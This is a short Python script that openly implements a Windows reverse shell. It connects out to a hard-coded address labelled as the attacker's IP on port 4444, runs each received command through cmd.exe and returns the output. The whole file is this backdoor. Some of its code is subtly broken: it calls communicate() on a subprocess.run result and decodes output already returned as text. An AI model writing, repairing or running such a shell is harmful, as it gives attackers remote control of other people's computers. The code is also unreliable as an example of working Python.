import socket
import subprocess

def connect_to_remote_server(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    # Spawn a shell
    while True:
        command = s.recv(1024).decode('utf-8')
        if command == 'exit':
            break
        try:
            proc = subprocess.run(f" cmd.exe /c {command}", shell=True,  text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output, error = proc.communicate()

            if error:
                response = error.decode('utf-8')
            else:
                response = output.decode('utf-8')
           
            s.send(response.encode('utf-8'))
            print(f"[Server] Received command: {command}")
            print(f"[Server] Response: {response}")
        except Exception as e:
            s.send(str(e).encode('utf-8'))
            print(f"[Server] Error: {str(e)}")

    s.close()

if __name__ == "__main__":
    ip = "192.168.1.100"  # Replace with the attacker's IP address
    port = 4444           # Replace with the attacker's port
    connect_to_remote_server(ip, port)

